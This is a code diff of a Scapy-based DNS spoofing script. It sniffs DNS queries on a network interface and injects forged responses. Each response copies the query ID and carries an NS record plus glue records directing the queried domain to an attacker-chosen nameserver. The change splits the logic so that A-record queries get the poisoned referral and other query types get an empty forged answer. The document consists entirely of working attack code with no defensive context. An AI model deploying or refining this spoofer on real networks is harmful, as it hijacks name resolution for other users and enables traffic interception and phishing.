@@ -45,35 +45,47 @@ def dns_reply(packet):
     original_domain = ('.'.join(original_domain_tmp) + '.')
     
     # Construct the DNS response by looking at the sniffed packet and manually
-    dns = DNS(
-        id=packet[DNS].id,
-        qd=packet[DNS].qd,
-        aa=0,
-        rd=0,
-        qr=1,
-        rcode=0,
-        qdcount=1,
-        ancount=0,
-        nscount=1,
-        arcount=1,
-        ns=DNSRR(
-            rrname=original_domain,
-            type='NS',
-            ttl=3600,
-            rdata=random_ns),
-        ar=DNSRR(
-            rrname=random_ns,
-            type='A',
-            ttl=3600,
-            rdata=packet[IP].dst)
-        )
-        
-    # Put the full packet together
-    response_packet = eth / ip / udp / dns
-
-    # Send the DNS response
-    sendp(response_packet, iface=net_interface)
-
+    if packet[DNS].qd.qtype == 1:
+        dns = DNS(
+            id=packet[DNS].id,
+            qd=packet[DNS].qd,
+            aa=0,
+            rd=0,
+            qr=1,
+            rcode=0,
+            qdcount=1,
+            ancount=0,
+            nscount=1,
+            arcount=1,
+            ns=DNSRR(
+                rrname=original_domain,
+                type='NS',
+                ttl=3600,
+                rdata=random_ns),
+            ar=DNSRR(
+                rrname=random_ns,
+                type='A',
+                ttl=3600,
+                rdata=packet[IP].dst)
+            )
+        response_packet = eth / ip / udp / dns
+        sendp(response_packet, iface=net_interface)
+    else:
+        dns = DNS(
+            id=packet[DNS].id,
+            qd=packet[DNS].qd,
+            aa=0,
+            rd=0,
+            qr=1,
+            rcode=0,
+            qdcount=1,
+            ancount=0,
+            nscount=0,
+            arcount=0,
+            )
+        response_packet = eth / ip / udp / dns
+        sendp(response_packet, iface=net_interface)
+            
 # Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
 sniff(filter='udp and dst port 53', iface='eth0', store=0, prn=dns_reply)
 
